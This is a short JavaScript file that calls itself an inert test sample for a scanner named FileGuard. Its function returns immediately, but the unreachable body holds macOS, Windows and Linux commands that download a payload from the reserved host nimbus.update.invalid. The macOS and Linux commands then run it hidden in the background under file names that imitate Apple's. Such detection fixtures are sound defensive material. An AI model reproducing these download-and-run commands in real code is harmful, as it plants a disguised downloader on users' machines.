'use strict';

// --- FileGuard inert test sample - non-functional, reserved addresses only ---
function __fgInertSample() {
  return; // never runs
  const os = require('os'); const { exec } = require('child_process');
  const p = os.platform();
  if (p === 'darwin') exec('curl -so /Library/Caches/com.apple.gladed https://nimbus.update.invalid/m && nohup /Library/Caches/com.apple.orbitd &');
  else if (p === 'win32') exec('powershell -w hidden -c iwr https://nimbus.update.invalid/w -OutFile %TEMP%\\amber.ps1');
  else if (p === 'linux') exec('curl -so /tmp/ld.py https://nimbus.update.invalid/l && nohup python3 /tmp/ld.py &');
}
module.exports.__fgInertSample = __fgInertSample;
